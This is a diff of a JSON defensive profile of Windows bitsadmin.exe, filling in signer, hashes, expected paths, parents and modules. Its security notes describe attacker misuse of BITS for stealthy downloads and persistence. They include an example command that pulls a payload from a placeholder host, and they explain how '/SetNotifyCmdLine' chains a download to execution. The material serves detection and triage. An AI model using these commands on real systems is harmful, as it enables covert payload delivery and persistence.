@@ -11,43 +11,170 @@
   ],
   "description": "bitsadmin.exe is a command-line tool for creating and managing BITS (Background Intelligent Transfer Service) jobs, which download or upload files in the background through a Windows service. Windows Update and many installers rely on BITS to fetch data resiliently. Microsoft has deprecated bitsadmin in favor of PowerShell, but attackers still use it to download payloads and to run a command when a transfer finishes.\n",
   "about": "bitsadmin.exe drives the Background Intelligent Transfer Service, the Windows component that moves files in the background using spare bandwidth and survives reboots and dropped connections. BITS is the machinery behind much of Windows Update and software delivery. The genuine binary lives at `C:\\Windows\\System32\\bitsadmin.exe`. Microsoft deprecated it in favour of the PowerShell BITS cmdlets (`Start-BitsTransfer`), so newer scripts increasingly use those instead.\n\nA job is built up in steps: `/create` makes it, `/addfile` attaches a source URL and a local destination, and `/resume` starts the transfer. Two details matter for triage. The transfer itself is carried out by the BITS service inside `svchost.exe`, not by bitsadmin, so the network connection comes from the service rather than the tool. And `/SetNotifyCmdLine` attaches a command that BITS runs when the job completes.\n\nLegitimately, bitsadmin is uncommon on a normal desktop, because the BITS service does its work without anyone invoking the command-line tool. Its parent and the job it builds on the command line are what give an instance meaning.\n",
-  "publisher": null,
-  "issuer": null,
-  "signed": null,
-  "signing_rate": null,
-  "signing_algorithm": null,
-  "signers": [],
-  "file_details": null,
-  "file_versions": [],
-  "file_sizes": [],
-  "cert_thumbprints": [],
-  "provenance": "curated",
-  "prevalence_band": "unknown",
-  "prevalence_score": null,
-  "host_prevalence": null,
-  "execution_rank": null,
+  "publisher": "Microsoft Corporation",
+  "issuer": "Microsoft Windows Production PCA 2011",
+  "cert_serial": "3300000519DADDAA8BDC44B292000000000519",
+  "signed": true,
+  "signing_rate": 100,
+  "signing_algorithm": "sha256RSA",
+  "signers": [
+    "Microsoft Windows"
+  ],
+  "file_details": {
+    "file_type": "PE32+ executable",
+    "magic": "PE32+ executable (console)",
+    "original_name": "bitsadmin.exe.mui",
+    "internal_name": "bitsadmin.exe",
+    "product": "Microsoft® Windows® Operating System",
+    "copyright": "© Microsoft Corporation. All rights reserved."
+  },
+  "file_versions": [
+    {
+      "value": "7.8.26100.1 (WinBuild.160101.0800)",
+      "weight": "ubiquitous",
+      "pct": 100
+    }
+  ],
+  "file_sizes": [
+    {
+      "value": "236.00 KB",
+      "weight": "ubiquitous",
+      "pct": 100
+    }
+  ],
+  "architectures": [
+    {
+      "value": "x64",
+      "weight": "ubiquitous",
+      "pct": 100
+    }
+  ],
+  "cert_thumbprints": [
+    {
+      "value": "3b77db29ac72aa6b5880ecb2ed5ec1ec6601d847",
+      "weight": "ubiquitous",
+      "pct": 100
+    }
+  ],
+  "provenance": "measured",
+  "prevalence_band": "ubiquitous",
+  "prevalence_score": 75.6,
+  "host_prevalence": 100,
+  "execution_rank": 105,
   "community_score": null,
-  "first_seen": null,
-  "last_seen": null,
-  "machine_count": null,
-  "execution_count": null,
-  "expected_paths": [],
-  "expected_parents": [],
+  "first_seen": "2026-06-09",
+  "last_seen": "2026-06-09",
+  "machine_count": 1,
+  "execution_count": 1,
+  "expected_paths": [
+    {
+      "value": "C:\\Windows\\System32\\bitsadmin.exe",
+      "weight": "ubiquitous",
+      "pct": 100
+    }
+  ],
+  "expected_parents": [
+    {
+      "value": "cmd.exe",
+      "weight": "ubiquitous",
+      "pct": 100
+    }
+  ],
   "expected_children": [],
   "expected_grandparents": [],
   "expected_grandchildren": [],
   "network_ports": [],
   "listening_ports": [],
   "network_destinations": [],
-  "loaded_modules": [],
+  "loaded_modules": [
+    {
+      "value": "rpcrt4.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "bitsadmin.exe",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "ucrtbase.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "kernel32.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "kernel.appcore.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "combase.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "msvcrt.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "kernelbase.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "ntdll.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "sechost.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "sspicli.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    }
+  ],
   "named_pipes": [],
-  "user_contexts": [],
-  "integrity_levels": [],
-  "sessions": [],
+  "user_contexts": [
+    {
+      "value": "Interactive user",
+      "weight": "ubiquitous",
+      "pct": 100
+    }
+  ],
+  "integrity_levels": [
+    {
+      "value": "Medium",
+      "weight": "ubiquitous",
+      "pct": 100
+    }
+  ],
+  "sessions": [
+    {
+      "value": "Session 1",
+      "weight": "ubiquitous",
+      "pct": 100
+    }
+  ],
   "instance_counts": [],
   "token_privileges": [],
   "process_handles": [],
-  "os_prevalence": [],
+  "os_prevalence": [
+    {
+      "value": "Windows 11 (26200)",
+      "weight": "ubiquitous",
+      "pct": 100
+    }
+  ],
   "anomaly_signals": [
     {
       "signal": "Image path other than `C:\\Windows\\System32\\bitsadmin.exe`",
@@ -74,8 +201,49 @@
       "severity": "medium"
     }
   ],
-  "command_lines": [],
-  "known_hashes": [],
+  "command_lines": [
+    {
+      "command": "bitsadmin.exe",
+      "pct": 100
+    }
+  ],
+  "known_hashes": [
+    {
+      "algo": "rich_pe_header",
+      "value": "e262785041faa45a0ebbe04a1b6986a8",
+      "pct": 100
+    },
+    {
+      "algo": "md5",
+      "value": "48e11ce37a4b73911d61ca9db531e676",
+      "pct": 100
+    },
+    {
+      "algo": "sha256",
+      "value": "2b090bb7151bf87fc6fa36e13f509b5059a68e694eec2253f1ab74f9a7a0247b",
+      "pct": 100
+    },
+    {
+      "algo": "imphash",
+      "value": "d93f8f73a9f8629d0a8b416a7fcee86f",
+      "pct": 100
+    },
+    {
+      "algo": "ssdeep",
+      "value": "3072:bf9p3+Yf8tEONgUyvp22rxqZyuR18vCRyQSyRh/VUWaK7zXuF7U+A+x/0jNX3ZiX:bUyvUAqZjR16NsRh/VUWaK7zXuF7O+xJ",
+      "pct": 100
+    },
+    {
+      "algo": "authentihash",
+      "value": "9592c22ffeeb8bad6474d4fcc535958dca0009b12907a7cf576336851f19373c",
+      "pct": 100
+    },
+    {
+      "algo": "sha1",
+      "value": "29ee300acdae46792a4e1bdd012d0c7fa1c5d13f",
+      "pct": 100
+    }
+  ],
   "security_notes": "bitsadmin.exe is a stealthy download tool (T1105, T1197). A line like `bitsadmin /transfer job https://host/payload C:\\Users\\Public\\p.exe` pulls a file through the BITS service, which blends with normal update traffic and resumes across reboots. Crucially, the connection is made by `svchost.exe` hosting BITS, not by bitsadmin, so a network-centric view misses the origin entirely.\n\nIts real signature technique is BITS Jobs (T1197). `/SetNotifyCmdLine` tells BITS to run a program when a job finishes, which lets an attacker chain a download to execution, or stand up a long-lived or recurring job as persistence that re-runs their command. The job lives in the BITS database rather than an obvious autostart location, so it survives reboots and evades the usual persistence checks.\n\nIn every case the binary is the genuine signed bitsadmin, the work hides behind a legitimate background service, and the activity resembles an ordinary update. The command-line verbs (`/transfer`, `/addfile`, `/SetNotifyCmdLine`) and the parent are where the intent shows.\n",
   "mitre_attack": [
     "T1197",
